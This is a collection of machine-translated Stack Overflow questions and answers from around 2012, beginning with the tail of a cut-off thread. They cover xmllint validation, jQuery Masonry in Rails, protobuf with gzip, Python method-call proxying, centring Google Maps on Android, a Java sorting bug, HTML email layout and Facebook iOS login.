> 赞同：1
> 
> 时间：2012-12-15T18:42:06.383

`xmllint`做我需要的，例如：

```
xmllint --relaxng http://www.docbook.org/xml/5.0/rng/docbookxi.rng --noout ~/openstack-manuals/doc/src/docbkx/openstack-compute-admin/bk-compute-adminguide.xml 
```

这会输出一个字符串，指示验证是否成功：

```
/Users/lorin/openstack-manuals/doc/src/docbkx/openstack-compute-admin/bk-compute-adminguide.xml validates 
```

# jquery - jquery masonry 不渲染

> ID：13756747
> 
> 赞同：0
> 
> 时间：2012-12-07T04:05:48.373
> 
> 标签：jquery, ruby-on-rails-3, jquery-plugins, jquery-masonry

我正在使用 Jquery 插件 Masonry 在我的 Rails 应用程序上显示我的图像。我似乎无法让它工作。我已将 Masonry 脚本放入页面本身。我已经包含了砌体插件以及 jquery.js 文件。我还在 application.js 文件中取消了 =jquery 的注释。我的 Masonry 插件文件位于 assets 文件夹中的 javascript 文件夹中。我的代码是 <%= javascript_include_tag "jQuery.js" %> <%= javascript_include_tag "jquery.masonry.min.js" %>

```
<%= render 'nav' %>
<div id = "jags_show">
<h1>Your Jags </h1>
<div id = "clear"></div>
<hr />
<% if @jags.empty? %>
<p> NO JAGS UPLOADED YET <p>
<% else %>
<% @jags.each do |j| %>
    <div id = "jags">
        <li id = "jagimage"><%= image_tag j.image_url(:thumb) %></li>
        <p id = "jagname"> <%= j.name %> </p>
        <div class="actions">
         <%= link_to "update", edit_jag_path(j) %> |
         <%= link_to "remove", j, :confirm => 'Are you sure?', :method => :delete %>
        </div>
    </div>
<% end %>
<% end %>
</div>
<script>
$(function(){

var $container = $('#jags_show');

$container.imagesLoaded( function(){
  $container.masonry({
    itemSelector : '#jagimage'
  });
});

});
</script> 
```

无论我是否有脚本部分，我的网页都没有可见的变化。如果有人可以向我解释为什么会发生这种情况，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:35:07.063

你下载了jquery ruby​​ gem吗？

如果不。那可能是你的问题

将此添加到您的 gem 文件中

宝石'jquery-rails'

保存并运行 bundle install

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:38:16.170

听起来您确实需要花更多时间阅读资产管道手册。根据您所说的，您应该阅读以下内容：

1.  您不应该在 application.js 中“取消注释”任何内容。这些不是评论，它们是指令。 [http://guides.rubyonrails.org/asset_pipeline.html#manifest-files-and-directives](http://guides.rubyonrails.org/asset_pipeline.html#manifest-files-and-directives)

2.  如果您将 javascript 文件放在 assets/javascripts 下，则不需要使用 javascript_include_tag。您的布局中很可能有类似 <%= javascript_include_tag "application" %> 的内容，它会自动包含所有 javascript 文件。[http://guides.rubyonrails.org/asset_pipeline.html#asset-organization](http://guides.rubyonrails.org/asset_pipeline.html#asset-organization)

3.  现代浏览器有很好的工具来检查加载到页面中的资产。Chrome、Safari 和 Firefox 都有很好的“检查工具”，可以显示与您的请求相关的网络流量。我建议在那里查看您的浏览器成功请求了哪些文件。

# sudoku - sudoko 可以有多个解决方案吗

> ID：13756752
> 
> 赞同：0
> 
> 时间：2012-12-07T04:06:40.213
> 
> 标签：sudoku

我正在开发数独游戏。我只是想知道一个数独是否可以有超过 1 个解决方案，或者一个数独只能有 1 个唯一的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:12:09.593

是的，这通常取决于难度。Easy 和 Medium 几乎总是可以通过找到一个只有一种可能性的方格来解决，这将使其他方格只有一种可能性，依此类推。更难的可能不会限制您的选择，并迫使您猜测和检查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-09T18:21:03.260

具有多个解决方案的谜题是不完整的谜题。已发布的谜题有或被认为有一个解决方案。选择计算解决方案的软件方法可能会遗漏一些解决方案。

# c++ - 如何将多个协议缓冲区的消息写入可附加的 压缩文件？

> ID：13756755
> 
> 赞同：6
> 
> 时间：2012-12-07T04:07:07.530
> 
> 标签：c++, protocol-buffers

我正在使用协议缓冲区的 CodedOutputStream 和 FileOutputStream 将多个消息按顺序序列化到一个文件中，如下所示：

```
// File is opened using append mode and wrapped into
// a FileOutputStream and a CodedOutputStream
bool Open(const std::string& filename,
          int buffer_size = kDefaultBufferSize) {

    file_ = open(filename.c_str(),
                 O_WRONLY | O_APPEND | O_CREAT, // open mode
                 S_IREAD | S_IWRITE | S_IRGRP | S_IROTH | S_ISUID); //file permissions

    if (file_ != -1) {
        file_ostream_ = new FileOutputStream(file_, buffer_size);
        ostream_ = new CodedOutputStream(file_ostream_);
        return true;
    } else {
        return false;
    }
}

// Code for append a new message
bool Serialize(const google::protobuf::Message& message) {
    ostream_->WriteLittleEndian32(message.ByteSize());
    return message.SerializeToCodedStream(ostream_);
}

// Code for reading a message using a FileInputStream
// wrapped into a CodedInputStream 
bool Next(google::protobuf::Message *msg) {
    google::protobuf::uint32 size;
    bool has_next = istream_->ReadLittleEndian32(&size);
    if(!has_next) {
        return false;
    } else {
        CodedInputStream::Limit msgLimit = istream_->PushLimit(size);
        if ( msg->ParseFromCodedStream(istream_) ) {
            istream_->PopLimit(msgLimit);
            return true;
        }
        return false;
    }
} 
```

如何使用 GzipOutputStream 做同样的事情？可以像使用 CodedOutputStream 一样重新打开 gzip 压缩文件以附加新消息吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:55:25.230

我刚刚意识到我只需要将 FileOutputStream 包装在另一个 GzipOutputStream 中，如下所示：

```
file_ostream_ = new FileOutputStream(file_, buffer_size);
gzip_ostream_ = new GzipOutputStream(file_ostream_);
ostream_ = new CodedOutputStream(gzip_ostream_); 
```

阅读时，也可以这样做：

```
file_istream_ = new FileInputStream(file_, buffer_size);
gzip_istream_ = new GzipInputStream(file_istream_);
istream_ = new CodedInputStream(gzip_istream_); 
```

关闭并重新打开文件以附加消息也可以正常工作。

# python - Python捕获方法调用和参数

> ID：13756757
> 
> 赞同：1
> 
> 时间：2012-12-07T04:07:17.267
> 
> 标签：python

我正在尝试从单例类捕获函数调用而不覆盖该方法。

目前我正在这样做：

```
class MyClass
    oldMethod = None

    def __init__(self):
        c = Class.Instance()
        self.oldMethod = c.Method #make a copy to the pointer of the original function
        c.Method = self.NewMethod #redirect it

    def NewMethod(self, x, a):
        self.oldMethod(x, a) #call the old function
        #My Stuff 
```

我正在尝试捕获“事件”（作为方法调用）和此方法调用的参数。有没有其他方法可以说“被动”捕获它，只需听并获取参数。

注意：我无权访问单例类的代码。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T19:54:25.477

您提到您希望在正常操作期间拦截方法调用，而不仅仅是在调试期间。这个解决方案是一种与其他答案不同的方法，它使用[代理模式](http://en.wikipedia.org/wiki/Proxy_pattern)方法来创建一个新对象，该对象将成为对原始对象的所有调用的一种包装器。在代理级别，您可以根据需要记录和监控呼叫。

**人.py**

为了演示代码，我创建了一个`Person`在`person`模块中调用的示例类。我们可以假设这是您无法修改代码的模块。

```
class Person(object):
    def __init__(self, name=None):
        self.name = name

    def greet(self, greeting='hello'):
        print '%s %s' % (greeting, self.name)

    def __repr__(self):
        return "Person(%r)" % self.name 
```

**例子.py**

在下面的代码中，我们创建了一个名为的代理对象`ProxyPerson`，当使用它时，它的`Person`行为与其相同，并且具有记录所有对 greet 方法的调用的附加行为。您注意到它使用`*args, **kwargs`了因此 Person 将来可能具有不同的签名，但如果进行更改，代码不会中断。

```
import person

class ProxyPerson(person.Person):
    def greet(self, *args, **kwargs):
        print '--- greet() self=%r args=%r kwargs=%r' % (self, args, kwargs)
        super(ProxyPerson, self).greet(*args, **kwargs)

#person.Person = ProxyPerson #uncomment to monkey patch Person

jack, jill = person.Person('Jack'), ProxyPerson('Jill')
for p in jack, jill:
    p.greet()
    p.greet('hi')
    p.greet(greeting='why hello') 
```

**常规输出**

下面的输出显示了使用原始 Person 类或使用 ProxyPerson 时的执行差异。这些示例还包括不带位置参数、带位置参数和最后带关键字参数的调用。

```
hello Jack
hi Jack
why hello Jack
--- greet() self=Person('Jill') args=() kwargs={}
hello Jill
--- greet() self=Person('Jill') args=('hi',) kwargs={}
hi Jill
--- greet() self=Person('Jill') args=() kwargs={'greeting': 'why hello'}
why hello Jill 
```

**猴子补丁输出**

最后一个可以将[Monkey 补丁](http://en.wikipedia.org/wiki/Monkey_patch) `person.Person`类指向 ProxyPerson。您可以通过在`example.py`. 这种情况下的输出如下：

```
--- greet() self=Person('Jack') args=() kwargs={}
hello Jack
--- greet() self=Person('Jack') args=('hi',) kwargs={}
hi Jack
--- greet() self=Person('Jack') args=() kwargs={'greeting': 'why hello'}
why hello Jack
--- greet() self=Person('Jill') args=() kwargs={}
hello Jill
--- greet() self=Person('Jill') args=('hi',) kwargs={}
hi Jill
--- greet() self=Person('Jill') args=() kwargs={'greeting': 'why hello'}
why hello Jill 
```

猴子补丁的好处是所有未来的 person.Person 实例实际上都是已创建的代理对象的实例。Monkey patching 有它自己的一系列问题，在使用它之前你应该记住这些问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T05:08:31.263

您可以使用[winpdb](http://winpdb.org/)，它是一个非常易于使用的 python 图形调试器。因此，您只需打开有问题的 python 脚本，在您想要观看的任何类中的任何方法处设置[断点。](http://winpdb.org/docs/breakpoints/)它将在此时暂停并向您显示变量的状态以及每次调用该方法时未显示的内容。

# android - 如何在 Google Maps Android API v2 中直接将相机移动到当前位置？

> ID：13756758
> 
> 赞同：55
> 
> 时间：2012-12-07T04:07:28.593
> 
> 标签：android

无需点击任何按钮，如何直接获取当前位置并将相机移动到该位置。
另外，我发现地图的右上方有一个按钮。单击它时，它将转到当前位置。单击该按钮时如何获取返回的位置？

* * *

## 回答 #1

> 赞同：92
> 
> 时间：2012-12-16T21:51:37.523

make sure you have these permissions:

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/> 
```

Then make some activity and register a LocationListener

```
package com.example.location;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.view.View;
import com.actionbarsherlock.app.SherlockFragmentActivity;
import com.google.android.gms.maps.CameraUpdate;
import com.google.android.gms.maps.CameraUpdateFactory;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.SupportMapFragment;
import com.google.android.gms.maps.model.LatLng;

public class LocationActivity extends SherlockFragmentActivity implements LocationListener     {
private GoogleMap map;
private LocationManager locationManager;
private static final long MIN_TIME = 400;
private static final float MIN_DISTANCE = 1000;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.map);
    map = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map)).getMap();

    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME, MIN_DISTANCE, this); //You can also use LocationManager.GPS_PROVIDER and LocationManager.PASSIVE_PROVIDER        
}

@Override
public void onLocationChanged(Location location) {
    LatLng latLng = new LatLng(location.getLatitude(), location.getLongitude());
    CameraUpdate cameraUpdate = CameraUpdateFactory.newLatLngZoom(latLng, 10);
    map.animateCamera(cameraUpdate);
    locationManager.removeUpdates(this);
}

@Override
public void onStatusChanged(String provider, int status, Bundle extras) { }

@Override
public void onProviderEnabled(String provider) { }

@Override
public void onProviderDisabled(String provider) { }
} 
```

map.xml

```
<?xml version="1.0" encoding="utf-8"?>
<fragment xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/map"
android:layout_width="match_parent"
android:layout_height="match_parent"
class="com.google.android.gms.maps.SupportMapFragment"/> 
```

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2013-05-31T19:01:41.603

上面的答案不是根据 Google Doc 在 Google api v2 中引用的位置跟踪的内容。

我只是按照官方教程结束了这个类，它正在获取当前位置并在我得到它后立即将地图居中。

您可以扩展此类以使 LocationReciever 具有定期位置更新。我刚刚在 api level 7 上执行了这段代码

[http://developer.android.com/training/location/retrieve-current.html](http://developer.android.com/training/location/retrieve-current.html)

就这样吧。

```
import android.app.Activity;
import android.app.Dialog;
import android.content.Intent;
import android.content.IntentSender;
import android.location.Location;
import android.os.Bundle;
import android.support.v4.app.DialogFragment;
import android.support.v4.app.FragmentActivity;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesClient;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.location.LocationClient;
import com.google.android.gms.maps.CameraUpdate;
import com.google.android.gms.maps.CameraUpdateFactory;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.GoogleMap.OnMapLongClickListener;
import com.google.android.gms.maps.SupportMapFragment;
import com.google.android.gms.maps.model.LatLng;

public class MainActivity extends FragmentActivity implements 
    GooglePlayServicesClient.ConnectionCallbacks, 
    GooglePlayServicesClient.OnConnectionFailedListener{

private SupportMapFragment mapFragment;
private GoogleMap map;
private LocationClient mLocationClient;
/*
 * Define a request code to send to Google Play services
 * This code is returned in Activity.onActivityResult
 */
private final static int CONNECTION_FAILURE_RESOLUTION_REQUEST = 9000;

// Define a DialogFragment that displays the error dialog
public static class ErrorDialogFragment extends DialogFragment {

    // Global field to contain the error dialog
    private Dialog mDialog;

    // Default constructor. Sets the dialog field to null
    public ErrorDialogFragment() {
        super();
        mDialog = null;
    }

    // Set the dialog to display
    public void setDialog(Dialog dialog) {
        mDialog = dialog;
    }

    // Return a Dialog to the DialogFragment.
    @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        return mDialog;
    }
}

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main_activity);

    mLocationClient = new LocationClient(this, this, this);

    mapFragment = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map));
    map = mapFragment.getMap();

    map.setMyLocationEnabled(true);

}

/*
 * Called when the Activity becomes visible.
 */
@Override
protected void onStart() {
    super.onStart();
    // Connect the client.
    if(isGooglePlayServicesAvailable()){
        mLocationClient.connect();
    }

}

/*
 * Called when the Activity is no longer visible.
 */
@Override
protected void onStop() {
    // Disconnecting the client invalidates it.
    mLocationClient.disconnect();
    super.onStop();
}

/*
 * Handle results returned to the FragmentActivity
 * by Google Play services
 */
@Override
protected void onActivityResult(
                int requestCode, int resultCode, Intent data) {
    // Decide what to do based on the original request code
    switch (requestCode) {

        case CONNECTION_FAILURE_RESOLUTION_REQUEST:
            /*
             * If the result code is Activity.RESULT_OK, try
             * to connect again
             */
            switch (resultCode) {
                case Activity.RESULT_OK:
                    mLocationClient.connect();
                    break;
            }

    }
}

private boolean isGooglePlayServicesAvailable() {
    // Check that Google Play services is available
    int resultCode =  GooglePlayServicesUtil.isGooglePlayServicesAvailable(this);
    // If Google Play services is available
    if (ConnectionResult.SUCCESS == resultCode) {
        // In debug mode, log the status
        Log.d("Location Updates", "Google Play services is available.");
        return true;
    } else {
        // Get the error dialog from Google Play services
        Dialog errorDialog = GooglePlayServicesUtil.getErrorDialog( resultCode,
                                                                                                              this,
                                                                                                              CONNECTION_FAILURE_RESOLUTION_REQUEST);

        // If Google Play services can provide an error dialog
        if (errorDialog != null) {
            // Create a new DialogFragment for the error dialog
            ErrorDialogFragment errorFragment = new ErrorDialogFragment();
            errorFragment.setDialog(errorDialog);
            errorFragment.show(getSupportFragmentManager(), "Location Updates");
        }

        return false;
    }
}

/*
 * Called by Location Services when the request to connect the
 * client finishes successfully. At this point, you can
 * request the current location or start periodic updates
 */
@Override
public void onConnected(Bundle dataBundle) {
    // Display the connection status
    Toast.makeText(this, "Connected", Toast.LENGTH_SHORT).show();
    Location location = mLocationClient.getLastLocation();
    LatLng latLng = new LatLng(location.getLatitude(), location.getLongitude());
    CameraUpdate cameraUpdate = CameraUpdateFactory.newLatLngZoom(latLng, 17);
    map.animateCamera(cameraUpdate);
}

/*
 * Called by Location Services if the connection to the
 * location client drops because of an error.
 */
@Override
public void onDisconnected() {
    // Display the connection status
    Toast.makeText(this, "Disconnected. Please re-connect.",
            Toast.LENGTH_SHORT).show();
}

/*
 * Called by Location Services if the attempt to
 * Location Services fails.
 */
@Override
public void onConnectionFailed(ConnectionResult connectionResult) {
    /*
     * Google Play services can resolve some errors it detects.
     * If the error has a resolution, try sending an Intent to
     * start a Google Play services activity that can resolve
     * error.
     */
    if (connectionResult.hasResolution()) {
        try {
            // Start an Activity that tries to resolve the error
            connectionResult.startResolutionForResult(
                    this,
                    CONNECTION_FAILURE_RESOLUTION_REQUEST);
            /*
            * Thrown if Google Play services canceled the original
            * PendingIntent
            */
        } catch (IntentSender.SendIntentException e) {
            // Log the error
            e.printStackTrace();
        }
    } else {
       Toast.makeText(getApplicationContext(), "Sorry. Location services not available to you", Toast.LENGTH_LONG).show();
    }
}

} 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2017-11-10T07:15:11.577

我正在解释，假设您已经实现了**map-v2 ，****如何获取当前位置**并**直接将相机移动到当前位置。**更多详细信息，您可以参考[官方文档](https://developers.google.com/maps/documentation/android-api/current-place-tutorial)。

 **在 gradle 中添加位置服务

```
implementation "com.google.android.gms:play-services-location:11.0.1" 
```

在清单文件中添加位置权限

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /> 
```

确保您要求 RunTimePermission。我正在为此使用[Ask-Permission](https://github.com/Kishanjvaghela/Ask-Permission)。它易于使用。

现在参考下面的代码来获取当前位置并将其显示在地图上。

```
private FusedLocationProviderClient mFusedLocationProviderClient;

@Override
public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mFusedLocationProviderClient = LocationServices
                .getFusedLocationProviderClient(getActivity());

}

private void getDeviceLocation() {
        try {
            if (mLocationPermissionGranted) {
                Task<Location> locationResult = mFusedLocationProviderClient.getLastLocation();
                locationResult.addOnCompleteListener(new OnCompleteListener<Location>() {
                    @Override
                    public void onComplete(@NonNull Task<Location> task) {
                        if (task.isSuccessful()) {
                            // Set the map's camera position to the current location of the device.
                            Location location = task.getResult();
                            LatLng currentLatLng = new LatLng(location.getLatitude(),
                                    location.getLongitude());
                            CameraUpdate update = CameraUpdateFactory.newLatLngZoom(currentLatLng,
                                    DEFAULT_ZOOM);
                            googleMap.moveCamera(update);
                        }
                    }
                });
            }
        } catch (SecurityException e) {
            Log.e("Exception: %s", e.getMessage());
        }
} 
```

当用户授予位置权限时调用上述`getDeviceLocation()`方法

```
private void updateLocationUI() {
        if (googleMap == null) {
            return;
        }
        try {
            if (mLocationPermissionGranted) {
                googleMap.setMyLocationEnabled(true);
                googleMap.getUiSettings().setMyLocationButtonEnabled(true);
                getDeviceLocation();
            } else {
                googleMap.setMyLocationEnabled(false);
                googleMap.getUiSettings().setMyLocationButtonEnabled(false);
            }
        } catch (SecurityException e) {
            Log.e("Exception: %s", e.getMessage());
        }
    } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-10-04T09:36:39.877

只需将 moveCamera 更改为 animateCamera ，如下所示

```
Googlemap.animateCamera(CameraUpdateFactory.newLatLngZoom(locate, 16F)) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-06-29T13:02:35.163

**我的答案是针对那些在应用程序启动时正在寻找当前位置缩放动画的人。并获取当前位置的位置。**

如果有什么遗漏，请在评论中告诉我。

**注意：-**我**假设**您已授予所有**运行时**位置权限。

```
@Override
public void onMapReady(GoogleMap googleMap) {
    MapsInitializer.initialize(this);
    mMap = googleMap;

    getData(mMap);
    animateCamera();

} 
```

**getData 方法返回地图中理想位置的 lat lng。所以基本上最后相机缩放动画在当前位置变得理想。所以它给出了当前位置 lat lng。**

```
 private void getData(GoogleMap mMap) {

    mMap.setOnCameraIdleListener(new GoogleMap.OnCameraIdleListener() {
        @Override
        public void onCameraIdle() {

            LatLng center = mMap.getCameraPosition().target;
            String sLatitude = String.format("%.6f", center.latitude);
            String sLongitude = String.format("%.6f", center.longitude);
            StringBuilder mLatLng = new StringBuilder();
            mLatLng.append(sLatitude);
            mLatLng.append("°");
            mLatLng.append(" ");
            mLatLng.append(sLongitude);
            mLatLng.append("°");
            binding.latLng.setText(mLatLng);

        }
    });

private void animateCamera() {
    Location location = getLastKnownLocation();
    if (location != null) {

        mMap.setMyLocationEnabled(true);
        mMap.getUiSettings().setMyLocationButtonEnabled(true);
        mMap.getUiSettings().setAllGesturesEnabled(true);
        //delay is for after map loaded animation starts
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                mMap.animateCamera(CameraUpdateFactory.newLatLngZoom(new LatLng(location.getLatitude(), location.getLongitude()), 15));

            }
        }, 2000);
    }
} 
```

**这将返回最佳位置提供者**

```
private Location getLastKnownLocation() {
    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    List<String> providers = locationManager.getProviders(true);
    Location bestLocation = null;
    for (String provider : providers) {
        @SuppressLint("MissingPermission") Location l = locationManager.getLastKnownLocation(provider);
        if (l == null) {
            continue;
        }
        if (bestLocation == null || l.getAccuracy() < bestLocation.getAccuracy()) {
            // Found best last known location: %s", l);
            bestLocation = l;
        }
    }
    return bestLocation;
} 
```**

# java - Java 字符串排序错误

> ID：13756760
> 
> 赞同：0
> 
> 时间：2012-12-07T04:07:34.797
> 
> 标签：java, string, sorting, polymorphism

我正在尝试读取字符串并对它们进行排序。我收到了很多错误，这些错误在下面的代码中加了星号。你能告诉我如何解决这些错误吗？

```
package hw05;

/*
Demonstrates selectionSort on an array of strings.
*/
import java.util.Scanner;

public class Strings {
    // --------------------------------------------
    // Reads in an array of strings, sorts them,
    // then prints them in sorted order.
    // --------------------------------------------
    public static void main(String[] args) {

        String[] stringList;
        String size;

        Scanner scan = new Scanner(System.in);

        System.out.print("\nHow many strings do you want to sort? ");
        size = scan.nextLine();
        **stringList = new String[size];**

        System.out.println("\nEnter the strings...");
        **for (String i = 0; i < size; i++)
            stringList[i] = scan.nextLine();**
        Sorting.selectionSort(stringList);

        System.out.println("\nYour strings in sorted order...");
        **for (String i = 0; i < size; i++)
            System.out.print(stringList[i] + " ");**
        System.out.println();

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:09:25.180

```
stringList = new String[size]; 
```

大小应该`int`不是`String`。您需要执行以下操作：

```
int sizeInInt = Integer.valueOf(size); // This may throw NumberFormatException, wrap it in try/catch.

stringList = new String[sizeInInt ]; 
```

（或者）

将大小更改为`int`并执行，`nextInt()`而不是`nextLine()`

我建议在执行 nextInt() （或） nextLine() 之前执行 hasNext() ，否则您可能会得到`NoSuchElementException`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:09:42.350

首先，您应该发布您得到的确切错误。

话虽如此，看看每一行的这一部分：

```
String i = 0 
```

在这里，您声明了一个`String`名为的变量`i`，并为其分配了`0`一个`int`. 编译器会抱怨，因为您正在为变量分配不同类型的值。

这可能不是您的代码的唯一问题。正如我之前所说，请发布错误消息，以便我们更及时地为您提供帮助。

# html - HTML 和 PHP，创建包含两列的 HTML 电子邮件

> ID：13756768
> 
> 赞同：0
> 
> 时间：2012-12-07T04:07:55.877
> 
> 标签：html, css, php

好的，所以我的问题是我想要两列。我想要有关当前学校校长和其他一些人的头衔和姓名的信息在左边，实际字母在右边。但是，所有人的头衔和名称都显示在字母上方而不是左侧。我想知道是否有人可以查看我的代码并告诉我我错过了什么。我认为这可能是一个愚蠢的语法错误，或者我忘记声明一行但我看不到它。

谢谢

```
 These are the headers:
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

And this is the message:

$message = "

<HTML>
<HEAD>

<STYLE type=\"text/css\">
body {margin-top: 0px;margin-left: 0px;}
#page_1 {position:relative; overflow: hidden;margin: 169px 0px 121px 34px;padding: 0px;border: none;width: 782px;}
#page_1 #id_1 {float:left;border:none;margin: 98px 0px 0px 0px;padding: 0px;border:none;width: 182px;overflow: hidden;}
#page_1 #id_2 {float:left;border:none;margin: 0px 0px 0px 0px;padding: 0px;border:none;width: 600px;overflow: hidden;}
.ft0{font: bold 13px 'Times New Roman';text-decoration: underline;color: #47744c;line-height: 15px;}
.ft1{font: bold 12px 'Times New Roman';text-decoration: underline;color: #47744c;line-height: 14px;}
.ft2{font: bold 12px 'Times New Roman';color: #47744c;line-height: 15px;}
.ft3{font: bold 12px 'Times New Roman';text-decoration: underline;color: #47744c;line-height: 13px;}
.ft4{font: italic bold 12px 'Times New Roman';color: #47744c;line-height: 14px;}
.ft5{font: italic bold 12px 'Times New Roman';color: #47744c;line-height: 15px;}
.ft6{font: 16px 'Times New Roman';line-height: 19px;}
.ft7{font: italic 12px 'Times New Roman';line-height: 15px;}
.ft8{font: 15px 'Arial';line-height: 17px;}

.p0{text-align: left;margin-top: 0px;margin-bottom: 0px;}
.p1{text-align: left;margin-top: 13px;margin-bottom: 0px;}
.p2{text-align: left;margin-top: 1px;margin-bottom: 0px;}
.p3{text-align: left;margin-top: 12px;margin-bottom: 0px;}
.p4{text-align: left;margin-top: 11px;margin-bottom: 0px;}
.p5{text-align: left;margin-top: 2px;margin-bottom: 0px;}
.p6{text-align: left;margin-top: 25px;margin-bottom: 0px;}
.p7{text-align: left;padding-right: 384px;margin-top: 73px;margin-bottom: 0px;}
.p8{text-align: left;margin-top: 16px;margin-bottom: 0px;}
.p9{text-align: left;padding-right: 123px;margin-top: 18px;margin-bottom: 0px;}
.p10{text-align: left;padding-right: 123px;margin-top: 33px;margin-bottom: 0px;}
.p11{text-align: left;margin-top: 53px;margin-bottom: 0px;}
.p12{text-align: left;margin-top: 54px;margin-bottom: 0px;}
.p13{text-align: left;padding-right: 131px;margin-top: 17px;margin-bottom: 0px;}
.p14{text-align: left;margin-top: 0px;margin-bottom: 0px;white-space: nowrap;}
.p15{text-align: left;padding-left: 29px;margin-top: 0px;margin-bottom: 0px;white-space: nowrap;}

.td0{padding: 0px;margin: 0px;width: 115px;vertical-align: bottom;}
.td1{padding: 0px;margin: 0px;width: 103px;vertical-align: bottom;}

.tr0{height: 17px;}
.tr1{height: 22px;}

.t0{width: 218px;margin-left: 96px;margin-top: 17px;font: 15px 'Arial';}

</STYLE>
</HEAD>

<BODY>
<DIV id=\"page_1\">

<DIV>
<DIV id=\"id_1\">
<P class=\"p0 ft0\">Board of Trustees</P>
<P class=\"p1 ft1\">REDACTED</P>
<P class=\"p6 ft4\">“Nurturing Hearts,</P>
<P class=\"p2 ft5\">Developing Minds”&lt;/P>
</DIV>
<DIV id=\"id_2\">
<P class=\"p0 ft6\">$today</P>
<P class=\"p7 ft6\">$title $first_name  $last_name<br>$street_address<br>$city, $state $zip</P>
<P class=\"p8 ft6\">Dear $title $last_name,</P>
<P class=\"p9 ft6\">We have received your generous donation of $$mathAmt.00, and we are truly grateful. Since its founding in 1970, The School has been fortunate to receive philanthropic support from forward looking people like you who understand and appreciate the unique significance of our school’s mission in our community. Over these past <NOBR>forty-one</NOBR> years, many of our graduates have become respected professionals and leaders in our community, and our school is widely acknowledged as an important education resource in our region.</P>
<P class=\"p10 ft6\">On behalf of the Board of Trustees, the Faculty, and our Students, who are the ultimate recipients of your generosity, I wish to personally thank you. Your sacrificial donation sends an especially powerful message during theses challenging economic times about your devotion to the school.</P>
<P class=\"p11 ft6\">Sincerely yours,</P>
<P class=\"p12 ft6\">James </P>
<P class=\"p0 ft6\">Headmaster</P>
<P class=\"p13 ft8\">For tax purposes, School is pleased to provide the following information. No goods or services were rendered in exchange for this contribution. Please retain this letter for income tax purposes. This written acknowledgement of your donation serves as the substantiation required under section 170 of the Internal Revenue Code.</P>
<TABLE cellpadding=0 cellspacing=0 class=\"t0\">
<TR>
    <TD class=\"tr0 td0\"><P class=\"p14 ft8\">Date of Gift:</P></TD>
    <TD class=\"tr0 td1\"><P class=\"p15 ft8\">1/19/2012</P></TD>
</TR>
<TR>
    <TD class=\"tr1 td0\"><P class=\"p14 ft8\">Value of Gift*<SPAN class=\"ft6\">:</SPAN></P></TD>
    <TD class=\"tr1 td1\"><P class=\"p15 ft8\">$$mathAmt.00</P></TD>
</TR>
</TABLE>
</DIV>
</DIV>
</DIV>

</body>
</HTML>

"; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:27:58.453

如果您在浏览器中加载您的电子邮件看起来不错，所以我认为您没有做错任何事情，除了这个：

大多数电子邮件客户端不支持基于 div 的布局或非内联样式。您需要使用表格重做电子邮件以进行布局和所有内联 CSS（或通过已弃用的 html 属性声明）。

[http://htmlemailboilerplate.com/](http://htmlemailboilerplate.com/)可能会帮助您解决一些电子邮件特性。

# iphone - iOS Facebook SDK 3.1 如何在应用程序内登录并保留凭据？

> ID：13756771
> 
> 赞同：1
> 
> 时间：2012-12-07T04:08:05.740
> 
> 标签：iphone, ios, facebook, authentication, sdk

是否可以使用 Facebook iOS SDK 在应用程序内进行身份验证（而不是转到 Safari 或 Facebook 应用程序），并保留这些身份验证凭据以供下次启动应用程序使用？

当我尝试在模拟器中使用演示应用程序时，它总是去 safari 进行身份验证，这似乎有点蹩脚。然后，在我进行身份验证后，我无法重定向回我的应用程序。

有没有办法只向用户显示一个电子邮件字段和一个密码字段，然后将该信息保留在应用程序中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T09:08:35.847

在最好的情况下，您总是必须使用 Facebook 应用程序进行 SSO 或在最坏的情况下使用 Safari 登录。当然你也可以使用`SLComposeViewController`iOS6以后的，带来最好的用户体验。

